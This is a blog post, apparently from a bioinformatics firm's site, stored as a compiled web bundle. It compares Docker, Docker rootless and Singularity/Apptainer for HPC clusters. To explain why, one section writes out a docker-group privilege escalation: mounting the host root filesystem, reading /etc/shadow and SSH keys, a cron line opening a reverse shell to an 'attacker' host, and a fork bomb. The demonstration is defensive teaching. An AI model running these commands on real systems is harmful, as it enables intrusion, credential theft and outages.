"use strict";(globalThis.webpackChunkmy_website=globalThis.webpackChunkmy_website||[]).push([[9626],{269(e,n,i){i.r(n),i.d(n,{assets:()=>a,contentTitle:()=>l,default:()=>h,frontMatter:()=>o,metadata:()=>r,toc:()=>c});var r=i(2097),s=i(4848),t=i(8453);const o={slug:"containers-hpc-docker-singularity-apptainer",title:"Containers on HPC: From Docker to Singularity and Apptainer",authors:["river"],tags:["hpc","docker","containers","singularity","apptainer"],image:"./imgs/intro.png"},l=void 0,a={image:i(9831).A,authorsImageUrls:[void 0]},c=[{value:"The Docker Problem on HPC Systems",id:"the-docker-problem-on-hpc-systems",level:2},{value:"Why Docker Doesn&#39;t Work for Normal Users",id:"why-docker-doesnt-work-for-normal-users",level:3},{value:"Real Example: Docker Privilege Escalation",id:"real-example-docker-privilege-escalation",level:3},{value:"The Governance Challenge",id:"the-governance-challenge",level:3},{value:"Solution 1: Docker Rootless Mode",id:"solution-1-docker-rootless-mode",level:2},{value:"What is Docker Rootless?",id:"what-is-docker-rootless",level:3},{value:"How to Use Docker Rootless",id:"how-to-use-docker-rootless",level:3},{value:"Advantages",id:"advantages",level:3},{value:"Limitations for HPC",id:"limitations-for-hpc",level:3},{value:"Solution 2: Singularity (Now Apptainer)",id:"solution-2-singularity-now-apptainer",level:2},{value:"The HPC-Native Container Solution",id:"the-hpc-native-container-solution",level:3},{value:"Why Singularity/Apptainer Excels on HPC",id:"why-singularityapptainer-excels-on-hpc",level:3},{value:"Installing Singularity/Apptainer with Pixi (Recommended)",id:"installing-singularityapptainer-with-pixi-recommended",level:3},{value:"Building Singularity/Apptainer Containers",id:"building-singularityapptainer-containers",level:3},{value:"Integrating with HPC Job Schedulers",id:"integrating-with-hpc-job-schedulers",level:3},{value:"Key Singularity/Apptainer Features",id:"key-singularityapptainer-features",level:3},{value:"Practical Comparison: Running a Bioinformatics Pipeline",id:"practical-comparison-running-a-bioinformatics-pipeline",level:2},{value:"With Docker (Not Recommended on HPC)",id:"with-docker-not-recommended-on-hpc",level:3},{value:"With Docker Rootless (Better, Still Limited)",id:"with-docker-rootless-better-still-limited",level:3},{value:"With Singularity/Apptainer (HPC-Ready)",id:"with-singularityapptainer-hpc-ready",level:3},{value:"Migration Path: From Docker to Apptainer",id:"migration-path-from-docker-to-apptainer",level:2},{value:"Step 1: Identify Your Docker Images",id:"step-1-identify-your-docker-images",level:3},{value:"Step 2: Build Apptainer Containers",id:"step-2-build-apptainer-containers",level:3},{value:"Step 3: Test Locally",id:"step-3-test-locally",level:3},{value:"Step 4: Deploy on HPC",id:"step-4-deploy-on-hpc",level:3},{value:"Best Practices for HPC Containers",id:"best-practices-for-hpc-containers",level:2},{value:"When to Use What",id:"when-to-use-what",level:2},{value:"Conclusion",id:"conclusion",level:2},{value:"Further Reading",id:"further-reading",level:3}];function d(e){const n={a:"a",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,t.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.p,{children:"Container technologies have revolutionized software deployment and reproducibility in scientific computing. However, traditional Docker faces significant limitations in High-Performance Computing (HPC) environments. This post explores why Docker struggles on HPC systems and introduces modern alternatives like Docker rootless, Singularity, and Apptainer."}),"\n",(0,s.jsx)(n.h2,{id:"the-docker-problem-on-hpc-systems",children:"The Docker Problem on HPC Systems"}),"\n",(0,s.jsx)(n.h3,{id:"why-docker-doesnt-work-for-normal-users",children:"Why Docker Doesn't Work for Normal Users"}),"\n",(0,s.jsx)(n.p,{children:"Docker is powerful, but it comes with a critical security model that makes it problematic for shared HPC systems:"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Docker requires root privileges"})," to run containers. This is because Docker's daemon operates at the system level and needs elevated permissions to:"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Create network namespaces"}),"\n",(0,s.jsx)(n.li,{children:"Mount filesystems"}),"\n",(0,s.jsx)(n.li,{children:"Manage storage drivers"}),"\n",(0,s.jsx)(n.li,{children:"Access hardware resources"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"On HPC systems with many users sharing resources, giving Docker access to all users would be a security nightmare. A user with Docker access could:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Escalate privileges to root"}),"\n",(0,s.jsx)(n.li,{children:"Access other users' data through container mounts"}),"\n",(0,s.jsx)(n.li,{children:"Consume unlimited system resources"}),"\n",(0,s.jsx)(n.li,{children:"Bypass resource quotas and scheduling policies"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"real-example-docker-privilege-escalation",children:"Real Example: Docker Privilege Escalation"}),"\n",(0,s.jsx)(n.p,{children:"Here's a concrete demonstration of how a regular user can escalate to root privileges using Docker:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# A normal user with docker group membership\nwhoami\n# Output: regularuser\n\n# User runs a container and mounts the entire root filesystem\ndocker run -v /:/host -it ubuntu:latest bash\n\n# Inside the container, the user can access ALL system files as root\nroot@container# cat /host/etc/shadow\n# This reveals root password hashes that should be inaccessible!\n\nroot@container# cat /host/root/.ssh/id_rsa\n# Can steal other users\' SSH keys\n\nroot@container# whoami\n# Output: root (inside the container)\n\n# User can write files as root\nroot@container# echo "malicious content" > /host/etc/cron.d/backdoor\nroot@container# echo "* * * * * root /bin/bash -c \'bash -i >& /dev/tcp/attacker/4444 0>&1\'" > /host/etc/cron.d/reverse_shell\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What just happened?"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"A regular user (regularuser) gained root-level access"}),"\n",(0,s.jsxs)(n.li,{children:["The user accessed and modified system files (e.g., ",(0,s.jsx)(n.code,{children:"/etc/shadow"}),", cron jobs)"]}),"\n",(0,s.jsx)(n.li,{children:"The user could install backdoors, steal credentials, and compromise the entire system"}),"\n",(0,s.jsx)(n.li,{children:"This escalation is NOT prevented by Docker\u2014it's built into Docker's design"}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Another dangerous example: Escape the resource limits\n# User runs container with no resource restrictions\ndocker run -it --memory=unlimited --cpus=unlimited ubuntu:latest\n\n# Inside container, user runs a fork bomb\n:(){ :|:& };:\n\n# This crashes the entire HPC node, affecting ALL other users\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Why is this a problem?"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Docker's daemon runs as root"}),"\n",(0,s.jsx)(n.li,{children:"Any user in the docker group can communicate with the daemon"}),"\n",(0,s.jsx)(n.li,{children:"The daemon will mount/execute anything the user requests"}),"\n",(0,s.jsx)(n.li,{children:"There's no way to prevent privilege escalation once docker group access is granted"}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Standard Docker setup (unsafe on shared systems)\nsudo usermod -aG docker regularuser\n\n# Now regularuser can:\ndocker run -v /:/host ...     # Access ANY file on the system\ndocker run --privileged ...   # Run as root\ndocker pull malicious:latest  # Download backdoored containers\n"})}),"\n",(0,s.jsxs)(n.p,{children:["This is why ",(0,s.jsx)(n.strong,{children:"system administrators NEVER grant docker group access on shared HPC systems"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Typical Docker setup requires sudo\nsudo docker run -it ubuntu:latest bash\n\n# Even with docker group membership, this is a privilege escalation vector\ndocker run -it ubuntu:latest bash\n"})}),"\n",(0,s.jsx)(n.h3,{id:"the-governance-challenge",children:"The Governance Challenge"}),"\n",(0,s.jsx)(n.p,{children:"HPC clusters are carefully managed environments with:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Strict security policies"}),"\n",(0,s.jsx)(n.li,{children:"Resource allocation via job schedulers (Slurm, PBS)"}),"\n",(0,s.jsx)(n.li,{children:"Multi-tenant workloads requiring isolation"}),"\n",(0,s.jsx)(n.li,{children:"Audit trails for compliance"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"Docker's monolithic daemon architecture conflicts with these requirements. System administrators rightfully restrict Docker to prevent security breaches and resource conflicts."}),"\n",(0,s.jsx)(n.h2,{id:"solution-1-docker-rootless-mode",children:"Solution 1: Docker Rootless Mode"}),"\n",(0,s.jsx)(n.h3,{id:"what-is-docker-rootless",children:"What is Docker Rootless?"}),"\n",(0,s.jsx)(n.p,{children:"Docker rootless allows Docker to run without root privileges, addressing one layer of the privilege escalation problem. It uses user namespaces to isolate the daemon and containers."}),"\n",(0,s.jsx)(n.h3,{id:"how-to-use-docker-rootless",children:"How to Use Docker Rootless"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Installation:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Install rootless Docker\ncurl https://get.docker.com/rootless | sh\n\n# Verify installation\ndockerd-rootless-setuptool.sh install\n\n# Start the daemon\nsystemctl --user start docker\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Using rootless Docker:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# No sudo needed!\ndocker run -it ubuntu:latest bash\n\n# Check the user\ndocker run whoami\n# Output: root (but it's a mapped non-root user)\n"})}),"\n",(0,s.jsx)(n.h3,{id:"advantages",children:"Advantages"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u2705 No root daemon required"}),"\n",(0,s.jsx)(n.li,{children:"\u2705 Better isolation than standard Docker"}),"\n",(0,s.jsx)(n.li,{children:"\u2705 Improved security posture"}),"\n",(0,s.jsx)(n.li,{children:"\u2705 Familiar Docker experience for users"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"limitations-for-hpc",children:"Limitations for HPC"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u26a0\ufe0f Still uses Docker's storage and networking model"}),"\n",(0,s.jsx)(n.li,{children:"\u26a0\ufe0f Not optimized for cluster environments"}),"\n",(0,s.jsx)(n.li,{children:"\u26a0\ufe0f Doesn't integrate with HPC schedulers (Slurm)"}),"\n",(0,s.jsx)(n.li,{children:"\u26a0\ufe0f Limited resource control mechanisms"}),"\n",(0,s.jsx)(n.li,{children:"\u26a0\ufe0f Performance overhead in some scenarios"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"Docker rootless is a step forward but doesn't solve the fundamental mismatch between Docker's design and HPC requirements."}),"\n",(0,s.jsx)(n.h2,{id:"solution-2-singularity-now-apptainer",children:"Solution 2: Singularity (Now Apptainer)"}),"\n",(0,s.jsx)(n.h3,{id:"the-hpc-native-container-solution",children:"The HPC-Native Container Solution"}),"\n",(0,s.jsxs)(n.p,{children:["Singularity was purpose-built for HPC environments. It addresses the fundamental security and scheduling problems Docker has on clusters. In 2021, it was open-sourced as ",(0,s.jsx)(n.strong,{children:"Apptainer"})," by the Linux Foundation."]}),"\n",(0,s.jsx)(n.h3,{id:"why-singularityapptainer-excels-on-hpc",children:"Why Singularity/Apptainer Excels on HPC"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"User-focused design:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Run as normal user, no daemon required\nsingularity run mycontainer.sif\n\n# Direct execution without privilege escalation\nsingularity exec mycontainer.sif python script.py\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Container is a single file:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Portable and easy to manage\nls -lh mycontainer.sif\n# Output: -rw-r--r--  1 user group 2.5G Feb 11 10:00 mycontainer.sif\n\n# Copy between systems\ncp mycontainer.sif /cluster/home/user/\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Preserves user identity and permissions:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Inside container, you're still yourself\nsingularity exec mycontainer.sif id\n# Output: uid=1001(user) gid=1002(group)...\n\n# Access your files as expected\nsingularity exec mycontainer.sif ls -la ~\n"})}),"\n",(0,s.jsx)(n.h3,{id:"installing-singularityapptainer-with-pixi-recommended",children:"Installing Singularity/Apptainer with Pixi (Recommended)"}),"\n",(0,s.jsxs)(n.p,{children:["Since Singularity/Apptainer are commonly used across HPC systems and bioinformatics workflows, the modern approach is to install them globally using ",(0,s.jsx)(n.strong,{children:"Pixi"}),", which is much simpler and more reliable than traditional package managers."]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 1: Install Pixi (if not already installed):"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# One-time setup\ncurl -fsSL https://pixi.sh/install.sh | bash\n\n# Add pixi to your PATH to use in current shell, or open new shell to reload\nexport PATH="$HOME/.pixi/bin:$PATH"\n\n# Verify pixi installation\npixi --version\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 2: Install Apptainer globally:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Simple one-liner - that's it!\npixi global install apptainer\n\n# Verify installation\napptainer --version\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 3 (Optional): Install other common bioinformatics tools globally:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Install multiple tools at once\npixi global install apptainer -c conda-forge --expose apptainer\n\n# All tools are now available system-wide\napptainer --version\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Benefits of this approach:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["\u2705 ",(0,s.jsx)(n.strong,{children:"Simple"}),": Just ",(0,s.jsx)(n.code,{children:"pixi global install apptainer"})]}),"\n",(0,s.jsxs)(n.li,{children:["\u2705 ",(0,s.jsx)(n.strong,{children:"No sudo required"}),": Installs in user space"]}),"\n",(0,s.jsxs)(n.li,{children:["\u2705 ",(0,s.jsx)(n.strong,{children:"Works everywhere"}),": Linux, macOS, HPC clusters"]}),"\n",(0,s.jsxs)(n.li,{children:["\u2705 ",(0,s.jsx)(n.strong,{children:"Modern dependencies"}),": Always gets recent versions from conda-forge"]}),"\n",(0,s.jsxs)(n.li,{children:["\u2705 ",(0,s.jsx)(n.strong,{children:"Reproducible"}),": Lock files track exact versions if needed"]}),"\n",(0,s.jsxs)(n.li,{children:["\u2705 ",(0,s.jsx)(n.strong,{children:"Easy updates"}),": ",(0,s.jsx)(n.code,{children:"pixi global upgrade apptainer"})]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Verify the Installation:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Check version\napptainer --version\n\n# Run a test container from Docker Hub\napptainer run docker://ubuntu:22.04 echo "Apptainer works"\n\n# List available sub-commands\napptainer --help\n'})}),"\n",(0,s.jsx)(n.p,{children:"Once installed globally via Pixi, Apptainer is available to all projects and users without needing to activate environments for each session."}),"\n",(0,s.jsx)(n.h3,{id:"building-singularityapptainer-containers",children:"Building Singularity/Apptainer Containers"}),"\n",(0,s.jsx)(n.p,{children:"You can build from Docker images or write native definition files:"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Method 1: Convert Docker image"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Build directly from Docker Hub\napptainer build ubuntu.sif docker://ubuntu:22.04\n\n# Build from existing Docker image\napptainer build myapp.sif docker://myregistry.com/myapp:latest\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Method 2: Write a definition file"})}),"\n",(0,s.jsxs)(n.p,{children:["Create ",(0,s.jsx)(n.code,{children:"myapp.def"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-singularity",children:'Bootstrap: docker\nFrom: ubuntu:22.04\n\n%post\n    apt-get update\n    apt-get install -y python3 pip\n    pip install numpy scipy\n\n%environment\n    export PATH=/usr/local/bin:$PATH\n\n%runscript\n    exec python3 "$@"\n\n%help\n    This container runs Python analysis scripts\n'})}),"\n",(0,s.jsx)(n.p,{children:"Build it:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Note: first build may require sudo, but running requires no special privileges\napptainer build myapp.sif myapp.def\n\n# Run without any special privileges\napptainer run myapp.sif script.py\n"})}),"\n",(0,s.jsx)(n.h3,{id:"integrating-with-hpc-job-schedulers",children:"Integrating with HPC Job Schedulers"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"With Slurm:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"#!/bin/bash\n#SBATCH --job-name=analysis\n#SBATCH --ntasks=4\n#SBATCH --mem=16GB\n#SBATCH --time=01:00:00\n\n# Run container through scheduler\napptainer run myapp.sif python /data/analysis.py\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"With PBS:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"#!/bin/bash\n#PBS -N analysis\n#PBS -l select=1:ncpus=4:mem=16gb\n#PBS -l walltime=01:00:00\n\ncd $PBS_O_WORKDIR\napptainer run myapp.sif python /data/analysis.py\n"})}),"\n",(0,s.jsx)(n.p,{children:"Singularity doesn't interfere with scheduler resource allocation\u2014it uses standard system calls."}),"\n",(0,s.jsx)(n.h3,{id:"key-singularityapptainer-features",children:"Key Singularity/Apptainer Features"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Feature"}),(0,s.jsx)(n.th,{children:"Singularity/Apptainer"}),(0,s.jsx)(n.th,{children:"Docker"}),(0,s.jsx)(n.th,{children:"Docker Rootless"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"No daemon required"}),(0,s.jsx)(n.td,{children:"\u2705 Yes"}),(0,s.jsx)(n.td,{children:"\u274c No"}),(0,s.jsx)(n.td,{children:"\u274c No"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Single file format"}),(0,s.jsx)(n.td,{children:"\u2705 Yes"}),(0,s.jsx)(n.td,{children:"\u274c No"}),(0,s.jsx)(n.td,{children:"\u274c No"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"User identity preserved"}),(0,s.jsx)(n.td,{children:"\u2705 Yes"}),(0,s.jsx)(n.td,{children:"\u274c No"}),(0,s.jsx)(n.td,{children:"\u26a0\ufe0f Partial"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"HPC scheduler integration"}),(0,s.jsx)(n.td,{children:"\u2705 Yes"}),(0,s.jsx)(n.td,{children:"\u274c No"}),(0,s.jsx)(n.td,{children:"\u274c No"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Permission isolation"}),(0,s.jsx)(n.td,{children:"\u2705 Yes"}),(0,s.jsx)(n.td,{children:"\u26a0\ufe0f Limited"}),(0,s.jsx)(n.td,{children:"\u26a0\ufe0f Limited"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Resource control"}),(0,s.jsx)(n.td,{children:"\u2705 Via cgroups"}),(0,s.jsx)(n.td,{children:"\u2705 Native"}),(0,s.jsx)(n.td,{children:"\u26a0\ufe0f Limited"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Learning curve"}),(0,s.jsx)(n.td,{children:"\u26a0\ufe0f Moderate"}),(0,s.jsx)(n.td,{children:"\u2705 Low"}),(0,s.jsx)(n.td,{children:"\u2705 Low"})]})]})]}),"\n",(0,s.jsx)(n.h2,{id:"practical-comparison-running-a-bioinformatics-pipeline",children:"Practical Comparison: Running a Bioinformatics Pipeline"}),"\n",(0,s.jsx)(n.h3,{id:"with-docker-not-recommended-on-hpc",children:"With Docker (Not Recommended on HPC)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Requires privileged setup\nsudo docker run -v /data:/data myapp:latest \\\n  bwa mem reference.fa reads.fastq > output.sam\n"})}),"\n",(0,s.jsx)(n.h3,{id:"with-docker-rootless-better-still-limited",children:"With Docker Rootless (Better, Still Limited)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# No sudo, but still not HPC-optimized\ndocker run -v /data:/data myapp:latest \\\n  bwa mem reference.fa reads.fastq > output.sam\n"})}),"\n",(0,s.jsx)(n.h3,{id:"with-singularityapptainer-hpc-ready",children:"With Singularity/Apptainer (HPC-Ready)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Simple, no special privileges, works with Slurm\nsingularity exec myapp.sif \\\n  bwa mem reference.fa reads.fastq > output.sam\n\n# Or in a Slurm script\nsbatch -N 1 --ntasks=8 --mem=32G myjob.sh\n# (inside myjob.sh runs singularity as normal)\n"})}),"\n",(0,s.jsx)(n.h2,{id:"migration-path-from-docker-to-apptainer",children:"Migration Path: From Docker to Apptainer"}),"\n",(0,s.jsx)(n.h3,{id:"step-1-identify-your-docker-images",children:"Step 1: Identify Your Docker Images"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# List your images\ndocker images\n"})}),"\n",(0,s.jsx)(n.h3,{id:"step-2-build-apptainer-containers",children:"Step 2: Build Apptainer Containers"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Convert existing Docker images\napptainer build myapp.sif docker://myregistry/myapp:latest\n\n# Or build from Docker Compose\n# First, build your Docker image\ndocker build -t myapp:latest .\n\n# Then convert\napptainer build myapp.sif docker-daemon://myapp:latest\n"})}),"\n",(0,s.jsx)(n.h3,{id:"step-3-test-locally",children:"Step 3: Test Locally"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Run and verify\napptainer run myapp.sif command\napptainer exec myapp.sif python script.py\n"})}),"\n",(0,s.jsx)(n.h3,{id:"step-4-deploy-on-hpc",children:"Step 4: Deploy on HPC"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Copy to cluster\nscp myapp.sif user@hpc-cluster:/home/user/\n\n# Use in job scripts\nsbatch my_job.sh\n"})}),"\n",(0,s.jsx)(n.h2,{id:"best-practices-for-hpc-containers",children:"Best Practices for HPC Containers"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Minimize image size"})," - Large containers slow down transfer and startup"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Use caching layers efficiently"})," - Order Dockerfile commands from least to most frequently changed"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Bind mount data"})," - Keep data outside containers, use volume mounts"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Preserve user context"})," - Avoid setting specific UIDs in production containers"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Test locally first"})," - Verify on your machine before cluster deployment"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Version your containers"})," - Use tags, keep definition files in version control"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Document dependencies"})," - Include build instructions and software versions"]}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"when-to-use-what",children:"When to Use What"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Scenario"}),(0,s.jsx)(n.th,{children:"Recommendation"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Local development"}),(0,s.jsx)(n.td,{children:"Docker or Docker Desktop"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Single-user HPC access"}),(0,s.jsx)(n.td,{children:"Singularity/Apptainer"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Multi-tenant HPC cluster"}),(0,s.jsx)(n.td,{children:"Singularity/Apptainer (mandatory)"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Rootless requirement"}),(0,s.jsx)(n.td,{children:"Docker rootless or Singularity/Apptainer"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Kubernetes clusters"}),(0,s.jsx)(n.td,{children:"Docker or similar (not HPC-focused)"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Maximum compatibility"}),(0,s.jsx)(n.td,{children:"Singularity/Apptainer (works everywhere)"})]})]})]}),"\n",(0,s.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,s.jsx)(n.p,{children:"Docker is an excellent tool for development and modern cloud infrastructure, but HPC environments require a different approach. Docker rootless improves Docker's security model but doesn't fundamentally address HPC integration."}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Singularity/Apptainer is the clear choice for HPC"})," because it:"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Runs without a daemon or root privileges"}),"\n",(0,s.jsx)(n.li,{children:"Preserves user identity and permissions"}),"\n",(0,s.jsx)(n.li,{children:"Integrates seamlessly with job schedulers"}),"\n",(0,s.jsx)(n.li,{children:"Uses portable single-file containers"}),"\n",(0,s.jsx)(n.li,{children:"Was designed specifically for scientific computing clusters"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"If you're working on HPC systems, adopt Singularity/Apptainer. If you're developing locally, use Docker\u2014then convert to Singularity when deploying to the cluster. This hybrid approach gives you the best of both worlds: Docker's familiarity for development and Singularity's robustness for production HPC workloads."}),"\n",(0,s.jsx)(n.h3,{id:"further-reading",children:"Further Reading"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://apptainer.org/docs/",children:"Apptainer Documentation"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://singularity-ce.readthedocs.io/",children:"Singularity Documentation"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://docs.docker.com/engine/security/rootless/",children:"Docker Rootless Mode"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://apptainer.org/docs/user/main/docker_and_oci.html",children:"Converting Docker Images to Singularity"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},2097(e){e.exports=JSON.parse('{"permalink":"/river-docs/blog/containers-hpc-docker-singularity-apptainer","source":"@site/blog/2026-02/2026-02-11-containers-hpc.md","title":"Containers on HPC: From Docker to Singularity and Apptainer","description":"Container technologies have revolutionized software deployment and reproducibility in scientific computing. However, traditional Docker faces significant limitations in High-Performance Computing (HPC) environments. This post explores why Docker struggles on HPC systems and introduces modern alternatives like Docker rootless, Singularity, and Apptainer.","date":"2026-02-11T00:00:00.000Z","tags":[{"inline":true,"label":"hpc","permalink":"/river-docs/blog/tags/hpc"},{"inline":true,"label":"docker","permalink":"/river-docs/blog/tags/docker"},{"inline":true,"label":"containers","permalink":"/river-docs/blog/tags/containers"},{"inline":true,"label":"singularity","permalink":"/river-docs/blog/tags/singularity"},{"inline":true,"label":"apptainer","permalink":"/river-docs/blog/tags/apptainer"}],"readingTime":8.95,"hasTruncateMarker":true,"authors":[{"name":"Thanh-Giang Tan Nguyen","title":"Founder at RIVER","url":"https://www.facebook.com/nttg8100","page":{"permalink":"/river-docs/blog/authors/river"},"email":"nttg8100@gmail.com","socials":{"linkedin":"https://www.linkedin.com/in/thanh-giang-tan-nguyen-761b28190/","github":"https://github.com/nttg8100"},"imageURL":"https://avatars.githubusercontent.com/u/64969412?v=4","key":"river"}],"frontMatter":{"slug":"containers-hpc-docker-singularity-apptainer","title":"Containers on HPC: From Docker to Singularity and Apptainer","authors":["river"],"tags":["hpc","docker","containers","singularity","apptainer"],"image":"./imgs/intro.png"},"unlisted":false,"prevItem":{"title":"Docker Out of Docker: Running Interactive Web Applications for Data Analysis","permalink":"/river-docs/blog/docker-out-docker-bioinformatics-web-apps"},"nextItem":{"title":"How to Migrate from In-House Pipelines to Enterprise-Level Workflows: A Proven 3-Step Validation 